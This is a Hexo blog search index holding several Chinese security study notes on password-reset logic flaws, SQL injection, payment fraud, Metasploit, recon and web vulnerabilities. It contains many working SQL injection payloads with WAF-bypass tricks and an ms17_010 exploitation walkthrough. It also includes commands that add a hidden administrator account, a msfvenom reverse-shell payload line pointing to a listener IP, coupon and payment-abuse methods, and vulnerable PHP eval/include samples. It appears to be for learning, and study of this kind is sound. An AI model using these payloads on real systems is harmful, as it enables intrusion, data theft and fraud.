<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>翻墙</title>
      <link href="/2022/05/26/fan-qiang/"/>
      <url>/2022/05/26/fan-qiang/</url>
      
        <content type="html"><![CDATA[<p>“变则通，通则达”<br>之前写的教程再发一遍，不多说直接上链接<br>1.vps购买：<a href="https://billing.virmach.com/index.php?rp=/login">https://billing.virmach.com/index.php?rp=/login</a> 这个也需要挂代理访问。<br>我用centos7搭建的服务器，有个问题就是在搭建kcptun时pip版本太低而且还升级失败的问题，最后我选择了ubuntu作为服务器成功避免了这个问题。<br>2.Shadowsocks搭建教程 ：<a href="https://www.vpndada.com/shadowsocks-tutorial-cn/">https://www.vpndada.com/shadowsocks-tutorial-cn/</a> 对了，这个国内访问不了，需要挂代理查看，可以用下朋友的代理访问。<br>3.kcptun加速教程：<a href="https://okayjam.com/kcptun%E5%8A%A0%E9%80%9Fshadowsocks%E6%B5%81%E7%95%85%E7%9C%8B1080p%E8%A7%86%E9%A2%91/">https://okayjam.com/kcptun%E5%8A%A0%E9%80%9Fshadowsocks%E6%B5%81%E7%95%85%E7%9C%8B1080p%E8%A7%86%E9%A2%91/</a><br>4.其中ubuntu的python是没有pip的，需要手动去下载，网址：<a href="https://www.cnblogs.com/-Anguvia-/p/15119920.html">https://www.cnblogs.com/-Anguvia-/p/15119920.html</a><br>最后说一下我的客户端是用的我朋友的，我就是改了配置文件（端口，ip等），最后客户端的设置一定要和服务端设置一致，否则就会出现连接失败问题。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞之密码找回</title>
      <link href="/2022/05/26/luo-ji-lou-dong-zhi-mi-ma-zhao-hui/"/>
      <url>/2022/05/26/luo-ji-lou-dong-zhi-mi-ma-zhao-hui/</url>
      
        <content type="html"><![CDATA[<h1 id="找回密码：重置密码："><a href="#找回密码：重置密码：" class="headerlink" title="找回密码：重置密码："></a>找回密码：重置密码：</h1><p>密码找回逻辑含有用户标识（用户名、用户 ID、cookie）、接收端（手机、邮箱）、凭证（验证码、token）、当前步骤等四个要素，若这几个要素没有完整关联，则可能导致任意密码重置漏洞。<br>修改id,改成自己的，自己的改成别人的，改cookie值，cookie检测注入等。</p><h2 id="ONE-重置凭证泄漏-找回密码，重置密码"><a href="#ONE-重置凭证泄漏-找回密码，重置密码" class="headerlink" title="ONE 重置凭证泄漏 找回密码，重置密码"></a>ONE 重置凭证泄漏 找回密码，重置密码</h2><p>案例一：首先注册，用正常用户试一遍，看异常。邮箱找回密码时抓包获取到验证码，说明验证码发给了客户端，构造邮箱即可重置密码。<br>案例二：找回密码的token发给了客户端，根据正常用户的显示，进行构造，进入重置密码页面。前提还需要爆破用户名，邮箱。提前看用户名，邮箱的格式进行构造爆破<br>案例三：收到token 的密码重置链接(token预测)，从中找端倪。<br>token可预测：时间戳，递增序号生成token，关键字段生成token，前面两种多试几次，找到规律，最后一个找关键字段匹配经过md5加解密，其他编码解码等进行尝试，匹配。<br>总结：把密码找回的凭证发给了客户端。验证码和token</p><h2 id="TWO-重置凭证接收端可篡改-手机号更改"><a href="#TWO-重置凭证接收端可篡改-手机号更改" class="headerlink" title="TWO 重置凭证接收端可篡改 手机号更改"></a>TWO 重置凭证接收端可篡改 手机号更改</h2><ol><li>第二步验证身份时更改手机号为我的手机号，获取验证码。</li></ol><p>2.更改用户为我的用户名，用我的手机号收取验证码。<br>试试传两个手机号码进去。1是可能两个号码收到同样短信，2是说不定能绕过某些短信发送频率限制。<br>总结：每次都进行后端的验证，不能只进行前端验证通过就可以了。</p><h2 id="THREE-cookie混淆-设置新密码页面"><a href="#THREE-cookie混淆-设置新密码页面" class="headerlink" title="THREE  cookie混淆  设置新密码页面"></a>THREE  cookie混淆  设置新密码页面</h2><p>1.找到那个验证的参数sessid，相当于cookie的验证，用普通用户登录获取cookie值，改为普通用户cookie值进行密码更改。绕过验证码和前面的步骤直接进行密码重置。<br>2.提交短信验证码和新密码时抓包，改用户id，进行用户登录，查看用户敏感信息。批量：短信验证码的参数设置为空，或删除参数名。<br>总结：一定要将重置用户与接收重置凭证作一致性比较，直接从服务端直接生成，不从客户端获取。 四个步骤完全关联，参数污染，参数没有提交问题服务器也要进行判断。</p><h4 id="思路拓展：既然它是前端验证，每一步都可以是基于前端的，那么我们就可以通过更改js代码来达到绕过直接重置密码的操作。"><a href="#思路拓展：既然它是前端验证，每一步都可以是基于前端的，那么我们就可以通过更改js代码来达到绕过直接重置密码的操作。" class="headerlink" title="思路拓展：既然它是前端验证，每一步都可以是基于前端的，那么我们就可以通过更改js代码来达到绕过直接重置密码的操作。"></a>思路拓展：既然它是前端验证，每一步都可以是基于前端的，那么我们就可以通过更改js代码来达到绕过直接重置密码的操作。</h4><h2 id="four-重置凭证未校验（cookie-token）-简单的方式"><a href="#four-重置凭证未校验（cookie-token）-简单的方式" class="headerlink" title="four  重置凭证未校验（cookie,token） 简单的方式"></a>four  重置凭证未校验（cookie,token） 简单的方式</h2><p>案例一：因服务端未校验 token 导致可重置任意账号密码，修改重置密码的邮件<br>密保问题，密保验证时，没有设置密保的用户可以重置密码。</p><h2 id="Five-验证码爆破"><a href="#Five-验证码爆破" class="headerlink" title="Five  验证码爆破"></a>Five  验证码爆破</h2><p>对四位验证码进行爆破<br>结论：密码重置凭证强度提高，建议六位数字，有效期十分钟，并且验证码应校验一次后立即作废。另外，服务端应限制枚举等恶意请求。</p><h2 id="Six-应答中存在更改状态参数达到找回密码的操作。"><a href="#Six-应答中存在更改状态参数达到找回密码的操作。" class="headerlink" title="Six: 应答中存在更改状态参数达到找回密码的操作。"></a>Six: 应答中存在更改状态参数达到找回密码的操作。</h2><p>因为是前端验证，所以复制验证码成功的代码用在更改其他用户密码状态妈的位置。</p><h4 id="思路拓展：越权：我们无论是在登录密码修改时会遇到这种问题，还是在登录进系统之后，都可能存在这种前端验证，前端设置功能点，前端进行身份鉴别的问题。那么就会出现各种各样的越权行为，总归还是js前端的问题，那么我们看源码，看js代码就会发现很多有用的东西，可能有状态码信息，用户身份信息等，还有可能泄露各种接口，路径，只要有泄漏我们一个一个试可能有收获。"><a href="#思路拓展：越权：我们无论是在登录密码修改时会遇到这种问题，还是在登录进系统之后，都可能存在这种前端验证，前端设置功能点，前端进行身份鉴别的问题。那么就会出现各种各样的越权行为，总归还是js前端的问题，那么我们看源码，看js代码就会发现很多有用的东西，可能有状态码信息，用户身份信息等，还有可能泄露各种接口，路径，只要有泄漏我们一个一个试可能有收获。" class="headerlink" title="思路拓展：越权：我们无论是在登录密码修改时会遇到这种问题，还是在登录进系统之后，都可能存在这种前端验证，前端设置功能点，前端进行身份鉴别的问题。那么就会出现各种各样的越权行为，总归还是js前端的问题，那么我们看源码，看js代码就会发现很多有用的东西，可能有状态码信息，用户身份信息等，还有可能泄露各种接口，路径，只要有泄漏我们一个一个试可能有收获。"></a>思路拓展：越权：我们无论是在登录密码修改时会遇到这种问题，还是在登录进系统之后，都可能存在这种前端验证，前端设置功能点，前端进行身份鉴别的问题。那么就会出现各种各样的越权行为，总归还是js前端的问题，那么我们看源码，看js代码就会发现很多有用的东西，可能有状态码信息，用户身份信息等，还有可能泄露各种接口，路径，只要有泄漏我们一个一个试可能有收获。</h4><p>耐住性子，认真一点，可能你就会有收获。</p><pre><code>删除的艺术当响应包太多，无法清晰看出其逻辑，可以尝试删除的办法找到有用的信息，还有一些我们常规情况下一定有意义的东西可以并没有起作用，我们可以进行删除进行判断，可能结果会让你大吃一惊。我们不要让常识蒙蔽了双眼，多去尝试，尝试不可能。</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入手工检测</title>
      <link href="/2022/05/26/sql-zhu-ru-shou-gong-jian-ce/"/>
      <url>/2022/05/26/sql-zhu-ru-shou-gong-jian-ce/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入一般步骤"><a href="#sql注入一般步骤" class="headerlink" title="sql注入一般步骤"></a>sql注入一般步骤</h2><p>1.判断数字型，字符型  两者最主要的差别在于字符型注入需要闭合引号.<br>2.’有报错信息，用报错注入<br>3.1’ and ‘1’&#x3D;’1   1’ and ‘1’&#x3D;’2看回显，回显不同使用联合。<br>4.无报错，使用盲注，根据注入执行结果的布尔值(true,或false)，页面显示不同，使用布尔盲注。就是判断注入的结果。<br>1’ and ‘10’&#x3D;’10   1’ and ‘1’&#x3D;’2<br>5.注入结果不会被输出，并且不管注入成功还是失败都无任何回显，使用时间盲注。</p><h2 id="常见的检测语法"><a href="#常见的检测语法" class="headerlink" title="常见的检测语法"></a>常见的检测语法</h2><ol><li>‘ or ‘1’ &#x3D; ‘1</li><li>‘ and 1&#x3D;1#</li><li>‘and(select*from(select+sleep(0))a+union+select+1)&#x3D;’</li><li>‘ || 1&#x3D;1#  ‘ || 1&#x3D;2# (看页面和数据包变化)</li><li>|1&#x2F;(if(1&#x3D;2,1,exp(710)))|<br>get请求 –+  post请求 #<br>一.url<br>and updatexml(1,concat(0x7e,(select database()),0x7e),1)<br>and updatexml(200,concat(0x7e,version()),0x7e),100) –+</li></ol><p>空格–%0a 代替 绕waf</p><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="ONe-显注：报错和-联合-有报错信息-当union前面的语句为false时才会执行后面语句"><a href="#ONe-显注：报错和-联合-有报错信息-当union前面的语句为false时才会执行后面语句" class="headerlink" title="ONe:显注：报错和  联合:有报错信息  当union前面的语句为false时才会执行后面语句"></a>ONe:显注：报错和  联合:有报错信息  当union前面的语句为false时才会执行后面语句</h3><p>1’ and ‘1’&#x3D;’1   1’ and ‘1’&#x3D;’2看回显，回显不同使用显注。<br>1.先找闭合字符，一直使用#进行闭合符号的寻找。 有可能有过滤 ‘ or ‘1’ &#x3D; ‘1    ‘|| 1&#x3D;1#  ‘|| 1&#x3D;2# (看页面变化)  |1&#x2F;(if(1&#x3D;2,1,exp(710)))<br>or–||  #–%23   sleep()–mid()   and–&amp;&amp;  ‘–%27   + - * &#x2F;    </p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>搜索型：演示%’ union    and ‘%’ &#x3D;’<br>编码 加密<br>json     {“username”:”admin”}– {“username”:”admin’ order by 3#”}  {“username”:”admin’ and 1&#x3D;2 union select 1,2,3#”}<br>宽字节：id &#x3D; 1%df’<br>2.order by 猜字段<br>3.根据猜到的字段数 id&#x3D;1 and 1&#x3D;2 union select </p><p>id&#x3D;1’)|1&#x2F;(if(1&#x3D;2,1,exp(710)))|’(               |sleep(2),floor(),version()|</p><h3 id="TWO-盲注：注入结果无任何回显即是盲注-页面有变化-报文返回长度，时间等"><a href="#TWO-盲注：注入结果无任何回显即是盲注-页面有变化-报文返回长度，时间等" class="headerlink" title="TWO:盲注：注入结果无任何回显即是盲注 页面有变化 报文返回长度，时间等"></a>TWO:盲注：注入结果无任何回显即是盲注 页面有变化 报文返回长度，时间等</h3><p>and length(database())&#x3D;8 –+<br>and left(database(),1)&gt;’a’–+<br>and left(database(),2)&gt;’sa’–+</p><p>第一个表的第一，二个字符。<br>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101–+<br>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109–+<br>时间盲注:适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索。在注入结果不会被输出，并且不管注入成功还是失败页面始终只有一个反应时<br>布尔盲注：根据注入执行结果的布尔值(true,或false)，页面显示不同，由此作为判断注入结果的依据即是布尔盲注<br>and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+   and ord(mid((select id from emails order by id limit 0,1),1,1))&lt;105 </p><h3 id="THREE-POST注入"><a href="#THREE-POST注入" class="headerlink" title="THREE:POST注入"></a>THREE:POST注入</h3><p>‘) or (ord(substr(user(),1,1))&gt;1#<br>账号密码等。<br>and updatexml(1, concat(0x7e,(select distinct concat(0x7e,(select table_name),0x7e)from information_schema.tables where table_schema&#x3D;’security’ limit 0,1 ),0x7e),1)#</p><p>1Referer：<br>2User-Agent: ‘ and updatexml(1,concat(0x7e,(select database())),1) and ‘1’ &#x3D;’1<br>3Cookie: uname&#x3D;admin’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)  #</p><p>学会构造闭合 常见 ：’ “ ‘) “) ‘)) “))<br>and 1&#x2F;exp(710)  floor() updatexml() 报错函数</p><p>id&#x3D;1’)–+   1’)  || ascii(substr(user(),1,1))&gt;97–+</p><h4 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h4><p>xxx&#x2F;1234.html<br>xxx&#x2F;id&#x2F;123.html   xxx&#x2F;id&#x2F;123 and 1&#x3D;1.html（注入点）</p><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>1.判断注入点，构造闭合，加上–+注释符闭合sql语句<br>2.fuzzsql关键字来判断waf规则<br>3.静态文件绕过  1.php&#x2F;test.css  改post  让网页布局改变<br>4.畸形协议 post改上传包  身体编码改变<br>5.enjoy表情<br>6.脏数据<br>7.关键字替换</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol><li><p>盗取用户数据和隐私。</p></li><li><p>攻击者可对目标数据库进行“增删改查”，一旦攻击者删库，企业整个业务将陷于瘫痪，极难恢复。</p></li><li><p>植入网页木马程序，对网页进行篡改，发布一些违法犯罪信息。</p></li><li><p>攻击者添加管理员帐号。即便漏洞被修复，如果企业未及时察觉账号被添加，则攻击者可通过管理员帐号，进入网站后台。</p></li></ol><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>  首当其冲，应该提升开发人员的安全意识。许多针对web的攻击，都是由于开发人员安全意识薄弱造成的。其次，我们可以通过各种技术手段，防御SQL注入，例如用户权限管理、分级管理、参数传值、使用安全参数、漏洞扫描、多层验证、数据库信息加密等等。预编译：输入的一串，都被揉在一起，作一个参数值，而不是sql语句。</p><h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><p>  高权限用户有读写 操作。<br>  DBA用户有管理MySQL中具体数据库(testdb)的权限；<br>  mysql root   mssql  sa  –iis.net asp,aspx<br>  mysql  @@version   db_name()  获取当前用户名：user,system_user,current_user</p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>Access: and (select count(<em>) from MSysAccessObjects)&gt;0 返回正常说明是access and exists(select count(</em>) from 表)<br>SQLserver: and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql，这个表只有MSSQL数据库才有<br>MySQL: and length(user())&gt;0 返回正常说明是MySQL </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/2022/04/14/luo-ji-lou-dong-zhi-ye-wu-shu-ju-an-quan/"/>
      <url>/2022/04/14/luo-ji-lou-dong-zhi-ye-wu-shu-ju-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="支付逻辑漏洞：请求篡改-支付篡改-优惠券-数量篡改"><a href="#支付逻辑漏洞：请求篡改-支付篡改-优惠券-数量篡改" class="headerlink" title="支付逻辑漏洞：请求篡改  支付篡改 优惠券 数量篡改"></a>支付逻辑漏洞：请求篡改  支付篡改 优惠券 数量篡改</h2><p>1.签约漏洞：<br>月自动付费，第一个a手机点自动续费然后到支付页面，然后多个手机登录同一个账号进行相同操作，然后a手机进行支付签约，成功后在第三方应用解除自动续费。替他手机也进行相同操作，由于都是提前打开了支付页面，所以付费金额都是享受到了新用户首月优惠的金额。前提是用户本身就是新用户。 原理是提前到下单支付页面， 如果不提前到下单支付页面在次下单是不允许的。<br>比较容易出现在活动页面的会员优惠开通。<br>2.会员升级：<br>手机a开通会员后，进行升级为超级会员的操作，这时候只需要花补差价的钱，到支付页面，用手机b登录相同账号进行开通超级会员，进入到升级页面，所以只需要花补差价的钱，然后a,b手机进行支付，第二个超会只花了补差价的钱。原理都是提前到支付页面 变相的创建变相订单。<br>程序是在支付后进行校验的<br>3.订单关闭：很少<br>使用优惠券创建订单，停留在支付页面，比如微信扫描但是不支付，然后关闭订单，发现优惠券返还了，然后使用优惠券在此创建订单，把第一个未支付的订单进行支付。发现订单到了发货状态，这种情况就是可以优惠券无限使用，尤其是金额比较大的优惠券，金额就比较大了。<br>4.并发<br>5.支付金额：分后面是厘0.019&#x3D;0.02  支付金额0.019，但是微信付款只有分钱，支付为0.01，但是服务器上是支付0.019的，还有服务器是四舍五入的显示为0.02. 数量特别大的话钱也挺多的。<br>6.数量溢出<br>int范围：-2147483648~2147483647<br>当支付金额为2147483649 时就变为了1<br>也可以把商品数量增加把价钱增加到2147483649</p><p><em>无论做什么都不要给自己设限，加油！</em></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>建立属于你自己的博客</title>
      <link href="/2022/04/06/jian-li-shu-yu-ni-zi-ji-de-bo-ke/"/>
      <url>/2022/04/06/jian-li-shu-yu-ni-zi-ji-de-bo-ke/</url>
      
        <content type="html"><![CDATA[<p>这个博客建立的可谓历经坎坷，但功夫不负有心人，终归是建立好了，我不啰嗦，直接上链接。</p><p>1.开始建博客同步到github上看这两个足够了。</p><p><a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=9905aff1-65c9-46d9-b5ec-6b11b27c18cc&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1630328278&amp;unique_k=gS5gKJ">https://www.bilibili.com/video/BV1mU4y1j72n?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=9905aff1-65c9-46d9-b5ec-6b11b27c18cc&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1630328278&amp;unique_k=gS5gKJ</a></p><p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-15">https://sunhwee.com/posts/6e8839eb.html#toc-heading-15</a></p><p>2.然后我的博客主题是根据这个人的设置的，他的文章每一步非常清晰。</p><p><a href="https://www.cnblogs.com/mfrank/p/12830097.html#autoid-0-2-0aa">https://www.cnblogs.com/mfrank/p/12830097.html#autoid-0-2-0aa</a></p><p>3.购买域名：<a href="https://www.namesilo.com/">https://www.namesilo.com/</a></p><p>4.申请CloudFlare免费DNS服务：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><p>可能有一处出现错误就可能搭建不成功或者域名设置不成功，域名的一些设置可以在百度多看几篇文章。Over.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基础知识</title>
      <link href="/2022/04/06/ji-chu-zhi-shi/"/>
      <url>/2022/04/06/ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>1.查看端口，杀进程。</p><p>netstat -ano | findstr “port”<br>tasklist | findstr “9327”  当前端口号<br>taskkill &#x2F;f &#x2F;t &#x2F;im 1.exe</p><p>2.linux</p><p>rm -rf<br>ls -la<br>mkdir<br>cd &#x2F;home   cd ~ #切换到当前用户目录  cd .. #返回上一级目录   cd &#x2F; #切换到根目录<br>pwd #打印当前工作目录<br>mkdir dir1 dir2<br>touch<br>cat<br>echo #默认把内容显示到终端上<br>gzip filename<br>tar -xzvf filename.tar.gz<br>grep :强大的文本搜索工具<br>grep -n i file1 在file1中查找包含字符串i的行<br>ps -aux 显示瞬间进程状态<br>yum -y install<br>chmod 777 file  r&#x3D;4，w&#x3D;2，x&#x3D;1</p><p>3.端口状态</p><p>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。<br>报出服务名字是tcpwrapped，这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p><p>4.搜集源码<br>1.&#x2F;.git&#x2F;<br>2.&#x2F;.svn<br>3.&#x2F;.DS_Store   Mac<br>4.&#x2F;Composer.json  php特性<br>5.github泄露</p><p>5.网页搜索</p><p>inurl:     url中存在关键字的网页<br>site:       指定域名<br>intext     网页正文中的关键字<br>“site:edu.cn intext:后台管理”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>msf</title>
      <link href="/2022/04/06/msf/"/>
      <url>/2022/04/06/msf/</url>
      
        <content type="html"><![CDATA[<p>1.进入msf框架 搜索ms17_010<br>2.扫描靶机：使用模块 设置目标ip 执行扫描<br>3.攻击靶机：使用模块 设置目标ip 查看选项设置 执行攻击<br>4.直接拿到shell，execute -i -f cmd<br>5.创建新用户 root<br>net user root 123456 &#x2F;add<br>将用户 root 添加至管理员组<br>net localgroup administrators root &#x2F;add<br>6.截图 screenshot   拍照 webcam_snap 直播 webcam_stream 进入shell</p><p>用MSF生成远控马，msf的payload中能建立反弹shell的，比如reverse_tcp，LHOST参数（LHOST就是Local host的意思）是攻击方的IP地址，用来监听对方的连接的。其实很好理解，反弹shell嘛，就是建立反弹连接的，当然是反弹到攻击主机了。本机ip 端口 Local host 相反的是rhost<br>msfvenom -a x64 –platform windows  -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  LHOST&#x3D;192.168.42.49 LPORT&#x3D;4444  -i 3 -f exe -o payload_test.exe</p><p>前端：页面显示  后端：信息处理</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2022/04/06/xin-xi-shou-ji/"/>
      <url>/2022/04/06/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>1.收集域名信息<br>2.google收集敏感信息<br>3.收集子域名信息 子域名挖掘机 在线<br>4.收集常用端口信息 nmap masscan<br>5.指纹识别  cms (整站系统，文章系统)和web容器<br>6.查找真实ip  cdn 内容分发网络 因传输距离远设置的节点服务器<br>cdn 绕过 邮箱 邮件服务器域名ip<br>国外访问<br>域名ip历史记录<br>通过app找ip<br>7.收集敏感目录文件<br>8.社工<br>9.源码</p><p>二.相关基础知识</p><p>1.操作系统：nmap -O ip 识别操作系统<br>nmap -sV -O ip     -O:激活系统探测 -sV探测开放端口服务信息。<br>nmap -P0 ip 禁ping<br>nmap -v -n -A ip -v 详细输出 -n:表示不对目标做dns解析。-A：系统探测，版本检测，脚本扫描，路由追踪。<br>2.web：一.网站源码：cms   二.搭建平台：中间件安全     三.数据库<br>asp+access     php+mysql    aspx+mssql    jsp+mssql,oracle    python+mongodb<br>phpstudy  &#x2F;phpmyadmin<br>asp access mssql  php mysql   aspx mssql   jsp mssql,oracle<br>3.app<br>4.第三方：openssh  weblogic  jboss  redis  werv-u</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web漏洞总结</title>
      <link href="/2022/04/06/web-lou-dong-zong-jie/"/>
      <url>/2022/04/06/web-lou-dong-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="ONE-sql注入"><a href="#ONE-sql注入" class="headerlink" title="ONE:sql注入"></a>ONE:sql注入</h1><p>一．sql注入<br>1.sql注入产生原因原理：可控变量带入数据库查询，变量没有过滤或者过滤不严谨。<br>也就是页面信息和数据库产生交互。<br>2.按注入点：数字型  字符型 ‘ “  搜索型 %  %<br>编码型： 数据以编码值传递<br>加密型 数据以加密的密文发送  格式型 JSON     –+ #<br>二.按数据提交类型<br>GET  POST  Cookie  HTTP 头部:User-Agent、referer<br>三.执行效果<br>1.布尔盲注 时间盲注 报错盲注 堆查询 宽字节<br>2.宽字节：宽字节绕过:%df占用两个字节 乱码 如中文 使\不能出现。<br>（因为系统可能会自动添加)   id&#x3D;1%df’ order by 111<br>3.判断注入点：id&#x3D;1ajsdkjgj  错误，有注入点。<br>4.找注入点  注入点权限   是否是数据库管理员  –isdba<br>5.数据库类型<br>6.信息收集：操作系统，数据库，数据库版本信息收集： 操作系统： @@version_compile_so    version()  database()  user()<br>7.低版本：联合注入： order by x  挨个试  列 (猜解列名数量)    union select 1,2,3,4,x       id&#x3D;-1 看一下报错。哪里报错在哪里开始写查询信息。<br>8.高版本：在mysql5.0以上，存在一个自带数据库名：informaton_schema,存储所有数据库名，表名，列名信息。猜数据库 select schema_name from information_schema.schemata<br>mysql<br>1.低权限：常规注入<br>2.高权限：常规，文件读取：load_file  ,文件写入：into outfile<br>三．Waf绕过<br>安全狗绕过：伪造成百度爬虫，对hearder头进行设置，user-agent&#x3D;”baidu…”就是白名单的形式。<br>Sqlmap对waf绕过<br>编码防注入：–tamper&#x3D;base64encode.py<br>阿里云盾防sql注入  “union”替换”%23a%0aunion”等形式<br>如：–tamper&#x3D;rdog.py –random-agent –tables</p><h1 id="TOW-XSS"><a href="#TOW-XSS" class="headerlink" title="TOW:XSS"></a>TOW:XSS</h1><p>文件上传原理：对上传内容，过程没有过滤或过滤不完整<br>sql注入原理：可控变量带入数据库进行查询，变量没有过滤或者过滤不完全。<br>xss 原理：对输入输出没有进行严格的过滤，在页面执行js客户端脚本。   test.php？x&#x3D;&lt;&gt;alert(1)&lt;&#x2F;&gt;  可以控制页面的内容，对输入输出过滤不严格。<br>鸡肋：浏览器内核版本可以决定js脚本的执行。<br>分类：反射，存储，dom  反射和存储是发现不了的源代码的。<br>存储型：是存储在数据库的，留言板。持久攻击。<br>html Dom：查看更多，操作html代码。<br>反射<br>发包 x&#x3D;xiaodi &#x3D;&gt; x.php &#x3D;&gt;回包<br>存储型<br>发包 x&#x3D;xiaodi &#x3D;&gt; x.php &#x3D;&gt; 数据库 &#x3D;&gt;x.php&#x3D;&gt;回包<br>dom<br>发包 x&#x3D;xiaodi &#x3D;&gt;本地浏览器静态前端代码 &#x3D;&gt; x.php &#x3D;&gt;回包  可以代码分析，发现xss的。可以看到源代码。</p><p>条件 1.漏洞2.管理员登录3.浏览器没有拦截4.http only<br>cookie:存储本地，存活时间长 小中型<br>session 会话 存储服务器 存活时间短 大型 金融</p><h1 id="THREE-文件上传"><a href="#THREE-文件上传" class="headerlink" title="THREE:文件上传"></a>THREE:文件上传</h1><p>一．解析漏洞<br>1.iis 6.0  *.asp;xxx.jpg 此文件会被解析为asp执行</p><p>2.Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析,就再往左判断。 test2.php.jpg<br>3.Nginx:对于任意文件名，在后面添加&#x2F;xxx.php(xxx为任意字符)，即可将文件作为php解析。<br>二．cms漏洞<br>三．编辑器漏洞<br>四．Cve漏洞<br>五．文件上传思路<br>1.常规类：1.扫描获取上传2.会员中心上传3.后台系统4.各种途径<br>2.Cms:cms源码  通达OA cms<br>3.编辑器类：1.cheditor2.fckeditor3.kindeditor4.xxxeditor<br>4.Cve:代码审计，三方应用</p><h1 id="FORE-rce漏洞"><a href="#FORE-rce漏洞" class="headerlink" title="FORE:rce漏洞"></a>FORE:rce漏洞</h1><p>漏洞形成原因：可控变量，函数漏洞。<br>命令执行漏洞和代码执行漏洞：<br>root@ae63a3df5e26:&#x2F;var&#x2F;www&#x2F;html# cat test.php<br><?php        $code=$_GET['a'];        eval($code);?><br>ip&#x2F;test.php?a&#x3D;phpinfo();</p><p>防御：敏感函数禁用，变量固定，waf</p><p>poc验证漏洞是否存在  exp是漏洞利用代码<br>一句话菜刀原理：远程命令执行相似 把函数功能嵌套到程序里面。</p><h1 id="FIVE-目录遍历"><a href="#FIVE-目录遍历" class="headerlink" title="FIVE:目录遍历"></a>FIVE:目录遍历</h1><p>目录遍历漏洞原理比较简单，就是程序在实现上没有充分过滤用户输入的…&#x2F;之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是…&#x2F;，也可是…&#x2F;的ASCII编码或者是unicode编码等。</p><p>你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，<u>都是在功能设计中将要操作的文件使用变量的 方式传递给了后台</u><br>如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为</a><u>敏感信息泄露。</u></p><h1 id="SIX-文件包含"><a href="#SIX-文件包含" class="headerlink" title="SIX:文件包含"></a>SIX:文件包含</h1><p>通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>本地文件包含：绕过：.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;    …………………………………………………..         windows 大于256<br>远程文件包含：绕过：?   %20    %23<br>无限制的文件包含漏洞：<br>root@f3d91c74e2ee:&#x2F;var&#x2F;www&#x2F;html# cat include.php<br>&lt;?php</p><p>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename);</p><p>&#x2F;&#x2F;<a href="http://127.0.0.1:8080/include.php?filename=index.txt">http://127.0.0.1:8080/include.php?filename=index.txt</a><br>&#x2F;*<br>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename .” .html” );<br>*&#x2F;</p><p>?&gt;</p><p>index.txt:<br><?php    